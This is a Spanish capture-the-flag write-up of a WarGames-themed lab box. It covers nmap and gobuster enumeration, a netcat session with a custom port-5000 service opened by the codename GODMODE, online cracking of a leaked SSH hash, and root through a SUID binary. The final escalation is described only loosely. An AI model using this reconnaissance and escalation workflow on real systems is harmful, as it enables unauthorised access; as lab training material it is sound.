# 🧩 Enumeración de Servicios y Versiones

Después de identificar los puertos abiertos, procedemos a enumerar versiones y configuraciones específicas de cada servicio:

```bash
nmap -sCV -p21,22,80,5000 172.17.0.2
```

Durante esta fase se obtiene información relevante:

* Servicio SSH activo.
* Existencia del usuario **joshua** expuesto por banners o respuestas del servicio.
* Puerto `5000/tcp` ejecutando un servicio personalizado.

Esto sugiere que la explotación probablemente involucre interacción con servicios no estándar además del vector web.

---

# 🧭 Reconocimiento Web

## 🖥️ Acceso Inicial a la Aplicación

Accedemos al sitio web:

```bash
http://172.17.0.2
```

La aplicación responde correctamente, aunque inicialmente solo muestra contenido estático.

![Despliegue](Imagenes/pagina.png)

Debido a la ausencia de funcionalidades visibles, se procede a realizar enumeración de contenido oculto.

---

# 🗂️ Enumeración de Directorios

Utilizamos **Gobuster** para descubrir recursos no enlazados públicamente:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .env,.php,.bak,.old,.zip,.txt -b 403,404 --exclude-length 8068
```

Durante el fuzzing se identifican múltiples recursos.

![Despliegue](Imagenes/gobuste.png)

Uno de ellos resulta especialmente interesante:

```bash
/README.txt
```

Al acceder encontramos información operativa relacionada con **W.O.P.R.**, restricciones internas y pistas de ingeniería social.

![Despliegue](Imagenes/README.png)

Aspectos importantes descubiertos:

* Se menciona un sistema restringido.
* Referencias a **Falken**.
* Existencia de una posible funcionalidad oculta.
* Aparición explícita del término:

```text
Codename: GODMODE
```

Este dato será útil posteriormente.

---

# 🔌 Enumeración del Servicio Personalizado (Puerto 5000)

El puerto `5000/tcp` presentaba un servicio no identificado durante la enumeración inicial.

Para interactuar manualmente utilizamos Netcat:

```bash
nc 172.17.0.2 5000
```

![Despliegue](Imagenes/usuarion.png)

El servicio funciona como una consola interactiva limitada.

Durante la interacción se prueban comandos básicos, palabras clave encontradas en el README y distintos intentos de enumeración.

Gracias a las pistas previas se prueba el término:

```text
GODMODE
```

Tras múltiples pruebas se obtiene acceso a información sensible, incluyendo referencias al usuario encontrado anteriormente y credenciales almacenadas parcialmente ofuscadas.

![Despliegue](Imagenes/hashssh.png)

La contraseña aparece representada mediante hash, por lo que se procede a su crackeo offline.

---

# 🔓 Obtención de Credenciales

Se probaron distintas herramientas de cracking.

La plataforma que logró resolver el hash fue:

```text
https://hashes.com/es/decrypt/hash
```

Una vez identificado el valor real del hash, obtenemos credenciales válidas para SSH.

Acceso:

```bash
ssh joshua@172.17.0.2
```

Ya disponemos de acceso inicial como usuario con bajos privilegios.

---

# 🚩 Escalada de Privilegios

Una vez dentro del sistema, iniciamos enumeración local buscando binarios SUID:

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

Resultado relevante:

```bash
/usr/local/bin/godmode
```
![Despliegue](Imagenes/sshuno.png)

El binario posee permisos SUID:

```text
-rwsr-xr-x root root
```

Esto significa que se ejecuta con privilegios efectivos de **root**, independientemente del usuario que lo invoque.

---

## 🔬 Análisis del Binario

Ejecutamos el binario:

```bash
/usr/local/bin/godmode
```

Salida:

```text
W.O.P.R Simulation System v1.0
ACCESS DENIED. DEFCON remains at 5.
```

El programa aparentemente restringe funcionalidades, por lo que se procede a inspeccionarlo.

Primero identificamos cadenas internas:

```bash
strings /usr/local/bin/godmode
```

Entre las cadenas aparecen:

```text
setuid@GLIBC
main
W.O.P.R
```

Además observamos que el binario realiza llamadas privilegiadas.

Posteriormente verificamos su comportamiento.

El objetivo consiste en identificar archivos externos, llamadas del sistema o recursos que el binario utilice y que podamos manipular.

---

## 🌐 Descubrimiento de Recurso Compartido

Al revisar el contenido y comportamiento del binario, se identifica que puede interactuar con recursos externos.

Nos desplazamos al directorio:

```bash
cd /usr/local/bin/
```

Y levantamos un servidor HTTP simple:

```bash
python3 -m http.server
```

Desde otra sesión observamos accesos realizados hacia:

```text
GET /godmode HTTP/1.1
```

Esto confirma que el binario o servicio relacionado interactúa con recursos compartidos.

---

## 👑 Obtención de Root

Utilizando la palabra clave encontrada previamente:

```text
GODMODE
```

y aprovechando el comportamiento privilegiado del binario SUID, logramos ejecutar operaciones como root.

Verificación:

```bash
whoami
```

Salida:

```bash
root
```

Sistema comprometido exitosamente.

![Despliegue](Imagenes/root.png)
---
